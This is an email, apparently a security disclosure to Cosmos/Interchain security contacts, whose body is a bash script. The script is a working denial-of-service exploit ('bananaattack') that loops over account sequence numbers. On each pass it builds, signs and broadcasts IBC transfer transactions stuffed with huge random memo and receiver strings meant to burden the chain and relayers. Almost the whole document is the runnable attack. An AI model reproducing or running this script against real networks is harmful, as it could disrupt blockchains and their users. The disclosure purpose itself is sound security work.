MIME-Version: 1.0
Date: Sun, 8 Oct 2023 17:44:01 +0300
Message-ID: <CAK5+0FS5cc6EX-wDG_Bw46RBhgQ0yqHacD5fEjRbrpf38wc4jw@mail.gmail.com>
Subject: Bash script
From: Jacob Gadikian <jacob@notional.ventures>
To: zaki@iqlusion.io, security@interchain.io, jehan@informal.systems, 
	syed@interchain.io, Jessy Irwin <jessy@amulet.dev>, Moshe Mizrahi <mo@amulet.dev>, 
	Alex Sutaru <alex@notional.ventures>, Joe Bowman <joebowman@notional.ventures>, 
	Sheldon Dearr <sdearr1990@gmail.com>, Sam LitBit <sam@notional.ventures>, 
	Khanh Nguyen <khanh@notional.ventures>
Content-Type: multipart/alternative; boundary="000000000000206a4a06073581cb"

--000000000000206a4a06073581cb
Content-Type: text/plain; charset="UTF-8"

Pasta from below:



set -ue

SEQUENCE=16103




for i in $( eval echo {"$SEQUENCE"..10000000} )

do

echo "sequence number is $i"

# Make a new transaction body with a random string
gaiad tx ibc-transfer transfer transfer channel-58
cosmos1fjzgfyt8way9sp7hktnv2jv73j697gvz3fyptm 1uatom
--keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex
50000) --chain-id provider --packet-timeout-timestamp 0
--generate-only --fees 24000uatom --gas 1000000 --from
cosmos18hmramafeyg3xu3j8m6s4w38sgt93r29v7c8d5 &> bareibctx.json
echo "transaction body generated"

# Step 1: Generate the random hex string and save it to a temporary file
openssl rand -hex 200000 > tmp.txt
echo "random string generated"

# Step 2: Use jq with --arg to set the receiver field
jq --rawfile random_str tmp.txt '.body.messages[0].receiver =
$random_str' bareibctx.json > autobanana.json
echo "random string inserted"

# Step 3: remove the temporary file afterwards
rm tmp.txt
echo "temporary file removed"

# Step 4: Sign the transaction
gaiad tx sign autobanana.json --home /root/.gaia-rs --from
cosmos18hmramafeyg3xu3j8m6s4w38sgt93r29v7c8d5 --yes --sequence $i
--offline --account-number 495 --chain-id provider --keyring-backend
test &> signedbanana.json
echo "transaction signed"


# Step 5: Broadcast the transaction
gaiad tx broadcast signedbanana.json --home ~/.gaia-rs > bananaattack.log
echo "transaction broadcasted"

cat bananaattack.log

# Step 6: Check for a sequence number mismatch
	if [ $(grep -c "mismatch" bananaattack.log) -eq 1 ]
	then
		echo "sequence number mismatch"
		break
	fi



done

echo "if you're running it right the script just restarted"

--000000000000206a4a06073581cb
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"auto"><pre style=3D"text-wrap: wrap;"><br></pre><pre style=3D"t=
ext-wrap: wrap;">Pasta from below:</pre><pre style=3D"text-wrap: wrap;"><br=
></pre><pre style=3D"text-wrap: wrap;"><br></pre><pre style=3D"text-wrap: w=
rap;">set -ue

SEQUENCE=3D16103




for i in $( eval echo {&quot;$SEQUENCE&quot;..10000000} )

do

echo &quot;sequence number is $i&quot;

# Make a new transaction body with a random string
gaiad tx ibc-transfer transfer transfer channel-58 cosmos1fjzgfyt8way9sp7hk=
tnv2jv73j697gvz3fyptm 1uatom  --keyring-backend test --home ~/.gaia-rs --me=
mo $(openssl rand -hex 50000) --chain-id provider --packet-timeout-timestam=
p 0 --generate-only --fees 24000uatom --gas 1000000 --from cosmos18hmramafe=
yg3xu3j8m6s4w38sgt93r29v7c8d5 &amp;&gt; bareibctx.json
echo &quot;transaction body generated&quot;

# Step 1: Generate the random hex string and save it to a temporary file
openssl rand -hex 200000 &gt; tmp.txt
echo &quot;random string generated&quot;

# Step 2: Use jq with --arg to set the receiver field
jq --rawfile random_str tmp.txt &#39;.body.messages[0].receiver =3D $random=
_str&#39; bareibctx.json &gt; autobanana.json
echo &quot;random string inserted&quot;

# Step 3: remove the temporary file afterwards
rm tmp.txt
echo &quot;temporary file removed&quot;

# Step 4: Sign the transaction
gaiad tx sign autobanana.json --home /root/.gaia-rs --from cosmos18hmramafe=
yg3xu3j8m6s4w38sgt93r29v7c8d5 --yes --sequence $i --offline --account-numbe=
r 495 --chain-id provider --keyring-backend test &amp;&gt; signedbanana.jso=
n
echo &quot;transaction signed&quot;


# Step 5: Broadcast the transaction
gaiad tx broadcast signedbanana.json --home ~/.gaia-rs &gt; bananaattack.lo=
g
echo &quot;transaction broadcasted&quot;

cat bananaattack.log

# Step 6: Check for a sequence number mismatch
	if [ $(grep -c &quot;mismatch&quot; bananaattack.log) -eq 1 ]
	then
		echo &quot;sequence number mismatch&quot;
		break
	fi



done

echo &quot;if you&#39;re running it right the script just restarted&quot;

</pre><br></div>

--000000000000206a4a06073581cb--